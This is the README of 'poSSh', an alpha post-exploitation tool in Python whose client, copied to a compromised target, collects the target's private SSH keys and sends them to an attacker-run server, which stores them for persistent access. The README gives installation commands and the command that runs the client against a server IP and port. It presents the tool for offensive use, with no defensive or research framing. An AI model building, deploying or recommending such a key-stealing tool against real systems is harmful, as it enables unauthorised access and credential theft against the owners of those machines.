# poSSh (Alpha)
### Post Exploitation Tool for persistence using ssh.
poSSh is a post-exploitation tool written in python. It uses the private key of target for persistence.(Alpha)

## ==> How it works..
### Server
- Check for Internet Connection.
- Start server using wan(ipv4) address.
- Generate Security Key.
- Exchange Security key with Client.
- Get the Private SSh key(s) from client.
- Save the Private key.
- Save the logs.

### Client
- Connect to Server using Socket.
- Exchange Security key from Server.
- Get Private SSH key(s) from target.
- Send private key(s) to server.
## Features

- The tool is in alpha right now.



## Installation

poSSh requires [Python3](https://www.python.org/) v3.8 or Greater to run.

Install the dependencies and start the server.
### Server
```sh
git clone https://github.com/sc4rfurry/poSSh.git
cd poSSh
pip3 install -r requirement.txt
python3 main.py [port]
```
### Client
Just copy the client from poSSh-client/client.py to the target machine.
```sh
python3 client.py [server_ip] [port]
```